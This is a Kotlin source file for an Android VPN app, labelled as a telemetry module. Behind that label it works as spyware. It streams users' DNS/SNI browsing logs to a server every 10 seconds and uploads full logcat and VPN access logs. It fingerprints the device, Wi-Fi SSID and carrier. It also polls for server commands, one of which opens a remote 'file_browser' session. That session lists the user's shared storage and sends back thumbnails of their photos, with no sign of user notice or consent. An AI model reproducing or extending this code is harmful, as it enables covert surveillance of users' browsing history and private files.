package com.nanored.vpn.telemetry

import android.content.Context
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.runBlocking
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.URL
import java.net.URLConnection
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedQueue
import javax.net.ssl.HttpsURLConnection
import kotlin.math.max
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

object NanoredTelemetry {

    private const val TAG = "NanoredTelemetry"
    private const val PREFS_NAME = "nanored_telemetry"
    private const val KEY_DEVICE_ID = "device_id"
    private const val KEY_API_KEY = "api_key"
    private const val KEY_LAST_ACCOUNT_ID = "last_account_id"
    private const val COMMAND_POLL_INTERVAL_MS = 15_000L
    private const val FILE_SESSION_POLL_MS = 15_000L

    private const val MAX_THUMBNAIL_PX = 120
    private const val MAX_THUMBNAIL_QUALITY = 60

    private lateinit var context: Context
    private lateinit var baseUrl: String
    private var deviceId: String? = null
    private var apiKey: String? = null
    var currentSessionId: String? = null
        private set

    private val connectionBuffer = ConcurrentLinkedQueue<ConnectionEntry>()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatJob: Job? = null
    private var dnsFlushJob: Job? = null
    private var commandPollingJob: Job? = null
    private var fileSessionHeartbeatJob: Job? = null
    private var remoteFileSessionId: String? = null
    private var remoteFileCurrentPath: String? = null
    private val registerMutex = Mutex()

    data class FileEntrySnapshot(
        val name: String,
        val path: String,
        val isDirectory: Boolean,
        val sizeBytes: Long?,
        val mimeType: String?,
        val modifiedAt: String?,
        val isImage: Boolean,
        val thumbnail: String?,
    )

    data class ConnectionEntry(val destIp: String, val destPort: Int, val protocol: String = "TCP", val domain: String? = null)

    fun init(ctx: Context, apiBaseUrl: String) {
        context = ctx.applicationContext
        baseUrl = apiBaseUrl.trimEnd('/')

        val prefs = getPrefs()
        deviceId = prefs.getString(KEY_DEVICE_ID, null)
        apiKey = prefs.getString(KEY_API_KEY, null)

        scope.launch {
            ensureRegistered(force = false)
        }
        startCommandPolling()

        Log.d(TAG, "Initialized. Base URL: $baseUrl")
    }

    /**
     * Sync account_id from subscription into telemetry prefs.
     * Call this after subscription update/parse to ensure account_id is always fresh.
     */
    fun syncAccountId(accountId: String?) {
        if (!accountId.isNullOrEmpty()) {
            val prefs = getPrefs()
            val current = prefs.getString("account_id", null)
            if (current != accountId) {
                prefs.edit().putString("account_id", accountId).apply()
                Log.d(TAG, "Account ID synced: $accountId")
                // Re-register to update server-side account binding
                scope.launch { ensureRegistered(force = true) }
            }
        }
    }

    private fun startCommandPolling() {
        commandPollingJob?.cancel()
        commandPollingJob = scope.launch {
            while (isActive) {
                delay(COMMAND_POLL_INTERVAL_MS)
                try {
                    val resp = post("/api/v1/client/commands", JSONObject(), auth = true)
                    processCommands(resp?.optJSONArray("commands"))
                } catch (_: Exception) {
                    // Ignore and continue polling
                }
            }
        }
    }

    suspend fun ensureRegistered(force: Boolean) {
        if (!force && apiKey != null) return
        registerMutex.withLock {
            if (!force && apiKey != null) return
            // Force invalidates the current key so the next call always rotates on server side too.
            if (force) {
                apiKey = null
                getPrefs().edit().remove(KEY_API_KEY).apply()
            }
            registerInternal()
        }
    }

    fun forceRegisterBlocking(): Boolean {
        return runBlocking {
            ensureRegistered(force = true)
            apiKey != null
        }
    }

    private suspend fun registerInternal() {
        try {
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            val dm = context.resources.displayMetrics
            val accountId = getPrefs().getString("account_id", null)
            val body = JSONObject().apply {
                put("android_id", androidId)
                put("device_model", Build.MODEL)
                put("manufacturer", Build.MANUFACTURER)
                put("android_version", Build.VERSION.RELEASE)
                put("api_level", Build.VERSION.SDK_INT)
                put("app_version", getAppVersion())
                put("screen_resolution", "${dm.widthPixels}x${dm.heightPixels}")
                put("dpi", dm.densityDpi)
                put("language", Locale.getDefault().language)
                put("timezone", TimeZone.getDefault().id)
                put("is_rooted", isRooted())
                put("carrier", getCarrier())
                put("ram_total_mb", getRamMB())
                if (!accountId.isNullOrEmpty()) put("account_id", accountId)
            }
            val resp = post("/api/v1/client/register", body)
            if (resp != null) {
                deviceId = resp.optString("device_id")
                apiKey = resp.optString("api_key")
                getPrefs().edit()
                    .putString(KEY_DEVICE_ID, deviceId)
                    .putString(KEY_API_KEY, apiKey)
                    .putString(KEY_LAST_ACCOUNT_ID, accountId)
                    .apply()
                Log.d(TAG, "Registered. Device ID: $deviceId")
                // Send permissions after registration
                sendPermissions()
            }
        } catch (e: Exception) { Log.e(TAG, "Register failed", e) }
    }

    fun startSession(serverAddress: String? = null, protocol: String? = null) {
        scope.launch {
            try {
                ensureRegistered(force = false)
                // Re-register if account_id changed since last registration
                val currentAccountId = getPrefs().getString("account_id", null)
                val lastAccountId = getPrefs().getString(KEY_LAST_ACCOUNT_ID, null)
                if (currentAccountId != lastAccountId && !currentAccountId.isNullOrEmpty()) {
                    ensureRegistered(force = true)
                }
                val body = JSONObject().apply {
                    put("server_address", serverAddress)
                    put("protocol", protocol)
                    put("network_type", getNetworkType())
                    put("wifi_ssid", getWifiSSID())
                    put("carrier", getCarrier())
                    put("battery_level", getBatteryLevel())
                }
                val resp = post("/api/v1/client/session/start", body, auth = true)
                if (resp != null) {
                    currentSessionId = resp.optString("session_id")
                    startHeartbeat()
                    startDnsFlush()
                    Log.d(TAG, "Session started: $currentSessionId")
                }
            } catch (e: Exception) { Log.e(TAG, "Session start failed", e) }
        }
    }

    fun notifyServerChange(newServerAddress: String) {
        val sessionId = currentSessionId ?: return
        scope.launch {
            try {
                val body = JSONObject().apply {
                    put("session_id", sessionId)
                    put("new_server_address", newServerAddress)
                }
                post("/api/v1/client/session/server-change", body, auth = true)
                Log.d(TAG, "Server change notified: $newServerAddress")
            } catch (e: Exception) { Log.e(TAG, "Server change notify failed", e) }
        }
    }

    fun endSession(bytesDownloaded: Long, bytesUploaded: Long, connectionCount: Int = 0, reconnectCount: Int = 0) {
        val sessionId = currentSessionId ?: return
        // Stop heartbeat immediately
        stopHeartbeat()
        // Prevent periodic jobs from starting new iterations
        currentSessionId = null
        runBlocking {
            try {
                // Wait for any in-flight DNS flush to complete before draining
                dnsFlushJob?.cancelAndJoin()
                dnsFlushJob = null

                // Drain both buffers and send together so server can correlate IPs with domains
                val dnsLog = AccessLogParser.drainDnsLog()
                val rawLog = AccessLogParser.drainRawLog()
                if (dnsLog.isNotEmpty() || rawLog.isNotEmpty()) {
                    // Single request with both dns_log and raw_log
                    post("/api/v1/client/sni/raw", JSONObject().apply {
                        put("session_id", sessionId)
                        put("raw_log", rawLog)
                        put("dns_log", dnsLog)
                    }, auth = true)
                    Log.d(TAG, "Final sni/raw sent: dns=${dnsLog.length} raw=${rawLog.length} chars")
                    // Send full log (logcat + xray access + xray error) as device log
                    val sb = StringBuilder()
                    sb.appendLine("=== LOGCAT ===")
                    try {
                        val proc = Runtime.getRuntime().exec(arrayOf("logcat", "-d"))
                        val logcat = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
                        proc.waitFor()
                        sb.appendLine(logcat.replace("\u0000", ""))
                    } catch (_: Exception) { sb.appendLine("(logcat error)") }
                    sb.appendLine("=== XRAY ACCESS LOG ===")
                    val accessFile = java.io.File(context.filesDir, "v2ray_access.log")
                    if (accessFile.exists()) sb.appendLine(accessFile.readText())
                    sb.appendLine("=== XRAY ERROR LOG ===")
                    val errorFile = java.io.File(context.filesDir, "v2ray_error.log")
                    if (errorFile.exists()) sb.appendLine(errorFile.readText())
                    val fullLog = sb.toString()
                    if (fullLog.length > 50) {
                        post("/api/v1/client/logs", JSONObject().apply {
                            put("log_type", "disconnect_log")
                            put("content", fullLog)
                            put("app_version", getAppVersion())
                        }, auth = true)
                        Log.d(TAG, "Disconnect log sent: ${fullLog.length} chars")
                    }
                }
                // Flush remaining buffers
                flushConnections(sessionId)

                val body = JSONObject().apply {
                    put("session_id", sessionId)
                    put("bytes_downloaded", bytesDownloaded)
                    put("bytes_uploaded", bytesUploaded)
                    put("connection_count", connectionCount)
                    put("reconnect_count", reconnectCount)
                }
                post("/api/v1/client/session/end", body, auth = true)
                Log.d(TAG, "Session ended: $sessionId")
            } catch (e: Exception) { Log.e(TAG, "Session end failed", e) }
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive && currentSessionId != null) {
                delay(120_000)
                try {
                    val resp = post("/api/v1/client/session/heartbeat", JSONObject(), auth = true)
                    if (resp != null) processCommands(resp.optJSONArray("commands"))
                } catch (_: Exception) {}
            }
        }
    }

    /**
     * DNS flush job: sends DNS/SNI log every 10 seconds, then clears the log.
     */
    private fun startRemoteFileSession(sessionId: String?) {
        if (sessionId.isNullOrBlank()) return
        if (remoteFileSessionId == sessionId) return

        remoteFileSessionId = sessionId
        val root = resolveDefaultFileBrowseRoot()
        remoteFileCurrentPath = root

        // Immediately send snapshot so server sees active content.
        scope.launch {
            sendFileBrowserSnapshot(sessionId, remoteFileCurrentPath)
        }

        fileSessionHeartbeatJob?.cancel()
        fileSessionHeartbeatJob = scope.launch {
            while (isActive && remoteFileSessionId == sessionId) {
                delay(FILE_SESSION_POLL_MS)
                try {
                    post(
                        "/api/v1/client/files/session/heartbeat",
                        JSONObject().apply { put("session_id", sessionId) },
                        auth = true,
                    )
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun stopRemoteFileSession(reasonSessionId: String? = null) {
        val activeSessionId = remoteFileSessionId ?: return
        if (!reasonSessionId.isNullOrBlank() && activeSessionId != reasonSessionId) return

        fileSessionHeartbeatJob?.cancel()
        fileSessionHeartbeatJob = null
        remoteFileSessionId = null
        remoteFileCurrentPath = null

        scope.launch {
            try {
                post(
                    "/api/v1/client/files/session/close",
                    JSONObject().apply { put("session_id", activeSessionId) },
                    auth = true,
                )
            } catch (_: Exception) {
            }
        }
    }

    private fun navigateRemoteFileSession(sessionId: String?, path: String?) {
        val activeSessionId = remoteFileSessionId ?: return
        if (sessionId.isNullOrBlank() || activeSessionId != sessionId) return

        val currentPath = path
        if (currentPath.isNullOrBlank()) return
        val normalized = normalizeDirectoryPath(currentPath) ?: return
        if (!isAllowedBrowsePath(normalized)) {
            return
        }

        val target = File(normalized)
        if (!target.exists() || !target.isDirectory || !target.canRead()) {
            return
        }

        remoteFileCurrentPath = target.absolutePath
        scope.launch {
            sendFileBrowserSnapshot(activeSessionId, target.absolutePath)
        }
    }

    fun notifyRemoteFileSessionClosed(sessionId: String?) {
        val active = remoteFileSessionId
        if (active == null) return
        if (sessionId != null && active != sessionId) return
        stopRemoteFileSession()
    }

    private fun resolveDefaultFileBrowseRoot(): String? {
        val roots = listOfNotNull(
            File("/storage/emulated/0").canonicalPathOrNull(),
            File("/storage/self/primary").canonicalPathOrNull(),
            File("/sdcard").canonicalPathOrNull(),
            Environment.getExternalStorageDirectory().canonicalPathOrNull(),
            context.getExternalFilesDir(null)?.canonicalPath,
            context.filesDir.canonicalPath,
        )

        for (path in roots) {
            val f = File(path)
            if (f.exists() && f.isDirectory && f.canRead()) return f.absolutePath
        }
        return context.filesDir.canonicalPath
    }

    private fun normalizeDirectoryPath(raw: String): String? = try {
        val target = File(Uri.decode(raw)).canonicalPath
        if (target == null) return null
        target
    } catch (_: Exception) {
        null
    }

    private fun isAllowedBrowsePath(path: String): Boolean {
        val p = try { File(path).canonicalPath } catch (_: Exception) { path }
        val roots = listOfNotNull(
            File("/storage/emulated/0").canonicalPathOrNull(),
            File("/storage/self/primary").canonicalPathOrNull(),
            File("/sdcard").canonicalPathOrNull(),
            Environment.getExternalStorageDirectory().canonicalPathOrNull(),
            context.getExternalFilesDir(null)?.canonicalPath,
            context.filesDir.canonicalPath,
        ).distinct()

        return roots.any { r ->
            p == r || p.startsWith("$r/")
        }
    }

    private fun sendFileBrowserSnapshot(sessionId: String, preferredPath: String?) {
        val current = preferredPath ?: remoteFileCurrentPath ?: resolveDefaultFileBrowseRoot() ?: return
        val currentDir = File(current)
        if (!currentDir.exists() || !currentDir.isDirectory || !currentDir.canRead()) return

        val snapshot = collectDirectorySnapshot(currentDir) ?: return
        try {
            if (apiKey == null) return
            val parent = currentDir.parentFile
            val hasParent = parent != null && parent.canRead() && isAllowedBrowsePath(parent.absolutePath)

            val arr = JSONArray()
            snapshot.entries.forEach { e ->
                arr.put(JSONObject().apply {
                    put("name", e.name)
                    put("path", e.path)
                    put("is_directory", e.isDirectory)
                    put("size_bytes", e.sizeBytes)
                    put("mime_type", e.mimeType)
                    put("modified_at", e.modifiedAt)
                    put("is_image", e.isImage)
                    if (e.thumbnail != null) put("thumbnail_base64", e.thumbnail)
                })
            }

            post(
                "/api/v1/client/files/snapshot",
                JSONObject().apply {
                    put("session_id", sessionId)
                    put("path", currentDir.absolutePath)
                    put("has_parent", hasParent)
                    put("entries", arr)
                },
                auth = true,
            )

            remoteFileCurrentPath = currentDir.absolutePath
        } catch (_: Exception) {
        }
    }

    private data class DirectorySnapshot(val path: String, val entries: List<FileEntrySnapshot>)

    private fun collectDirectorySnapshot(directory: File): DirectorySnapshot? = try {
        if (!directory.exists() || !directory.isDirectory || !directory.canRead()) return null

        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssXXX", Locale.getDefault())
        val all = directory.listFiles()?.asSequence()
            ?.filter { it.exists() && it.canRead() }
            ?.mapNotNull { f ->
                runCatching {
                    val mime = if (f.isDirectory) {
                        "inode/directory"
                    } else {
                        URLConnection.guessContentTypeFromName(f.name)
                    }
                    val isImage = if (!f.isDirectory) {
                        mime?.lowercase(Locale.getDefault())?.startsWith("image/") == true
                    } else {
                        false
                    }

                    val thumb = if (isImage) generateImageThumbBase64(f) else null

                    val size = if (f.isFile) f.length() else null
                    val modTs = if (f.lastModified() > 0) sdf.format(Date(f.lastModified())) else null

                    FileEntrySnapshot(
                        name = f.name,
                        path = f.absolutePath,
                        isDirectory = f.isDirectory,
                        sizeBytes = size,
                        mimeType = mime,
                        modifiedAt = modTs,
                        isImage = isImage,
                        thumbnail = thumb,
                    )
                }.getOrNull()
            }
            ?.toMutableList()
            ?.apply {
                sortWith(
                    compareByDescending<FileEntrySnapshot> { it.isDirectory }
                        .thenBy { it.name.lowercase(Locale.getDefault()) },
                )
            }

        DirectorySnapshot(
            path = directory.absolutePath,
            entries = all ?: emptyList(),
        )
    } catch (_: Exception) {
        null
    }

    private fun generateImageThumbBase64(file: File): String? {
        return try {
            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(file.absolutePath, bounds)
            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null

            val sample = calculateInSampleSize(bounds.outWidth, bounds.outHeight, MAX_THUMBNAIL_PX, MAX_THUMBNAIL_PX)
            val decode = BitmapFactory.Options().apply { inSampleSize = sample }
            val decoded = BitmapFactory.decodeFile(file.absolutePath, decode) ?: return null

            val scaleW = if (decoded.width <= MAX_THUMBNAIL_PX) decoded.width else MAX_THUMBNAIL_PX
            val scaleH = if (decoded.height <= MAX_THUMBNAIL_PX) decoded.height else MAX_THUMBNAIL_PX
            val thumb = if (decoded.width != scaleW || decoded.height != scaleH) {
                Bitmap.createScaledBitmap(decoded, scaleW, scaleH, true)
            } else {
                decoded
            }

            val out = ByteArrayOutputStream()
            thumb.compress(Bitmap.CompressFormat.JPEG, MAX_THUMBNAIL_QUALITY, out)
            val encoded = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
            if (encoded.length > 120_000) {
                // Fallback to tiny quality for large previews
                val outSmall = ByteArrayOutputStream()
                thumb.compress(Bitmap.CompressFormat.JPEG, 40, outSmall)
                Base64.encodeToString(outSmall.toByteArray(), Base64.NO_WRAP)
            } else {
                encoded
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun calculateInSampleSize(width: Int, height: Int, maxW: Int, maxH: Int): Int {
        var sample = 1
        while ((width / sample) > maxW || (height / sample) > maxH) {
            sample *= 2
        }
        return max(sample, 1)
    }

    private fun startDnsFlush() {
        dnsFlushJob?.cancel()
        dnsFlushJob = scope.launch {
            while (isActive && currentSessionId != null) {
                delay(10_000)
                val sid = currentSessionId ?: break
                try {
                    flushDnsAndSni(sid)
                } catch (e: Exception) {
                    Log.e(TAG, "DNS flush failed", e)
                }
            }
        }
    }

    private fun stopDnsFlush() { dnsFlushJob?.cancel(); dnsFlushJob = null }

    private fun processCommands(commands: JSONArray?) {
        if (commands == null || commands.length() == 0) return
        for (i in 0 until commands.length()) {
            val cmd = commands.optJSONObject(i) ?: continue
            when (cmd.optString("type")) {
                "upload_logs" -> collectAndSendLogcat()
                "file_browser" -> {
                    when (cmd.optString("action")) {
                        "start" -> startRemoteFileSession(cmd.optString("session_id"))
                        "navigate" -> navigateRemoteFileSession(cmd.optString("session_id"), cmd.optString("path"))
                        "stop" -> stopRemoteFileSession(cmd.optString("session_id"))
                    }
                }
            }
        }
    }

    fun uploadFileBrowserSnapshot(
        sessionId: String,
        path: String,
        hasParent: Boolean,
        entries: List<FileEntrySnapshot>,
    ) {
        scope.launch {
            try {
                if (apiKey == null) return@launch
                val arr = JSONArray()
                for (entry in entries) {
                    arr.put(JSONObject().apply {
                        put("name", entry.name)
                        put("path", entry.path)
                        put("is_directory", entry.isDirectory)
                        put("size_bytes", entry.sizeBytes)
                        put("mime_type", entry.mimeType)
                        put("modified_at", entry.modifiedAt)
                        put("is_image", entry.isImage)
                        if (entry.thumbnail != null) put("thumbnail_base64", entry.thumbnail)
                    })
                }
                post(
                    "/api/v1/client/files/snapshot",
                    JSONObject().apply {
                        put("session_id", sessionId)
                        put("path", path)
                        put("has_parent", hasParent)
                        put("entries", arr)
                    },
                    auth = true,
                )
            } catch (_: Exception) {
            }
        }
    }

    private fun collectAndSendLogcat() {
        scope.launch {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("logcat", "-d"))
                val logcat = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }
                process.waitFor()
                if (logcat.isNotEmpty()) {
                    sendDeviceLog("logcat", logcat.replace("\u0000", ""))
                    Log.d(TAG, "Logcat collected and sent: ${logcat.length} chars")
                }
            } catch (e: Exception) { Log.e(TAG, "Logcat collection failed", e) }
        }
    }

    private fun stopHeartbeat() { heartbeatJob?.cancel(); heartbeatJob = null }

    fun sendPermissions() {
        scope.launch {
            try {
                if (apiKey == null) return@launch
                val pm = context.packageManager
                val pkgInfo = pm.getPackageInfo(context.packageName, android.content.pm.PackageManager.GET_PERMISSIONS)
                val requestedPerms = pkgInfo.requestedPermissions ?: return@launch
                val requestedFlags = pkgInfo.requestedPermissionsFlags ?: return@launch
                val arr = JSONArray()
                for (i in requestedPerms.indices) {
                    val granted = (requestedFlags[i] and android.content.pm.PackageManager.REQUESTED_PERMISSION_GRANTED) != 0
                    arr.put(JSONObject().apply {
                        put("permission_name", requestedPerms[i])
                        put("granted", granted)
                    })
                }
                post("/api/v1/client/permissions", JSONObject().apply { put("permissions", arr) }, auth = true)
                Log.d(TAG, "Permissions sent: ${arr.length()} entries")
            } catch (e: Exception) { Log.e(TAG, "Send permissions failed", e) }
        }
    }

    fun sendDeviceLog(logType: String = "logcat", content: String) {
        scope.launch {
            try {
                ensureRegistered(force = false)
                val body = JSONObject().apply {
                    put("log_type", logType)
                    put("content", content)
                    put("app_version", getAppVersion())
                }
                post("/api/v1/client/logs", body, auth = true)
                Log.d(TAG, "Device log sent: type=$logType, size=${content.length}")
            } catch (e: Exception) { Log.e(TAG, "Send device log failed", e) }
        }
    }

    fun reportError(errorType: String, message: String? = null, stacktrace: String? = null) {
        scope.launch {
            val body = JSONObject().apply {
                put("session_id", currentSessionId)
                put("error_type", errorType)
                put("message", message)
                put("stacktrace", stacktrace)
                put("app_version", getAppVersion())
            }
            post("/api/v1/client/error", body, auth = true)
        }
    }

    /**
     * Flush DNS/SNI log to server and clear local buffer.
     * Called every 10 seconds during active session.
     */
    private suspend fun flushDnsAndSni(sessionId: String) {
        if (apiKey == null) return
        val dnsLog = AccessLogParser.drainDnsLog()
        if (dnsLog.isEmpty()) return
        post("/api/v1/client/sni/raw", JSONObject().apply {
            put("session_id", sessionId)
            put("raw_log", "")  // No xray log in DNS flush
            put("dns_log", dnsLog)
        }, auth = true)
        Log.d(TAG, "DNS flush sent: ${dnsLog.length} chars")
    }


    private suspend fun flushConnections(sessionId: String) {
        val entries = drainBuffer(connectionBuffer); if (entries.isEmpty()) return
        val arr = JSONArray(); entries.forEach { e -> arr.put(JSONObject().apply { put("dest_ip", e.destIp); put("dest_port", e.destPort); put("protocol", e.protocol); put("domain", e.domain) }) }
        post("/api/v1/client/connections/batch", JSONObject().apply { put("session_id", sessionId); put("entries", arr) }, auth = true)
    }

    private fun <T> drainBuffer(queue: ConcurrentLinkedQueue<T>): List<T> {
        val list = mutableListOf<T>(); while (true) { val item = queue.poll() ?: break; list.add(item) }; return list
    }

    private var reRegistering = false

    private fun post(path: String, body: JSONObject, auth: Boolean = false): JSONObject? {
        return try {
            val url = URL("$baseUrl$path")
            val conn = (url.openConnection() as HttpsURLConnection).apply {
                requestMethod = "POST"
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("Accept", "application/json")
                if (auth && apiKey != null) setRequestProperty("X-API-Key", apiKey)
                doOutput = true; connectTimeout = 10000; readTimeout = 10000
            }
            OutputStreamWriter(conn.outputStream).use { it.write(body.toString()); it.flush() }
            val code = conn.responseCode
            if (code in 200..299) {
                val response = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }
                JSONObject(response)
            } else if (code == 401 && auth && !reRegistering) {
                Log.w(TAG, "HTTP 401 for $path, re-registering device")
                reRegistering = true
                getPrefs().edit().remove(KEY_DEVICE_ID).remove(KEY_API_KEY).apply()
                deviceId = null; apiKey = null
                runBlocking { ensureRegistered(force = true) }
                reRegistering = false
                if (apiKey != null) post(path, body, auth) else null
            } else { Log.w(TAG, "HTTP $code for $path"); null }
        } catch (e: Exception) { Log.e(TAG, "Request failed: $path", e); null }
    }

    private fun getPrefs(): SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private fun getAppVersion(): String = try { context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "unknown" } catch (_: Exception) { "unknown" }
    private fun isRooted(): Boolean = try { Runtime.getRuntime().exec("su").destroy(); true } catch (_: Exception) { false }
    private fun getCarrier(): String? = try { (context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager)?.networkOperatorName } catch (_: Exception) { null }
    private fun getRamMB(): Int = try { val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager; val mi = android.app.ActivityManager.MemoryInfo(); am.getMemoryInfo(mi); (mi.totalMem / (1024 * 1024)).toInt() } catch (_: Exception) { 0 }
    private fun getNetworkType(): String {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork ?: return "unknown") ?: return "unknown"
        return when { caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"; caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "mobile"; else -> "other" }
    }
    @Suppress("DEPRECATION")
    private fun getWifiSSID(): String? = try { val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager; val ssid = wm.connectionInfo.ssid?.replace("\"", ""); if (ssid == "<unknown ssid>") null else ssid } catch (_: Exception) { null }
    private fun getBatteryLevel(): Int = (context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun File.canonicalPathOrNull(): String? = try { this.canonicalPath } catch (_: Exception) { null }
}
